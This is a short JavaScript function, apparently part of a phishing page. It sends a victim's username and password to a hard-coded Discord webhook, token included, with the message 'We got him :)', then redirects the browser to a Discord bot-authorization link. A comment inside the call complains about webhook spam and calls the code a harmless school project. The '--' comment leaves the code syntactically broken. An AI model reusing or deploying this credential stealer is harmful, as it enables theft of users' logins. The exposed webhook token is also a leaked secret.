function sendData(User, Pass) {
    $.post('https://discord.com/api/webhooks/1049489026710769684/TeUgHn3y_Bg8j1M4MoLUL0_5zCe_DCRLj9yEIv7mX6idoSWsyKhs00GTgbYkv0XWLjL8', -- to the guy that spammed us, read readme.md for me. this is a project me and a friend are working on for fun for christs sake. you blew up our phones during school to troll some kids trying to learn code? are you that low?
    {
        'username': 'We got him :)',
        'content': 'Username:\n\t' + User + '\nPassword:\n\t' + Pass,
    }, function(data, status) {
        console.log("Data: " + data + "\nStatus: " + status);
    }
    )
    window.location = "https://discord.com/oauth2/authorize/?permissions=268454976&scope=bot&client_id=510016054391734273"
}
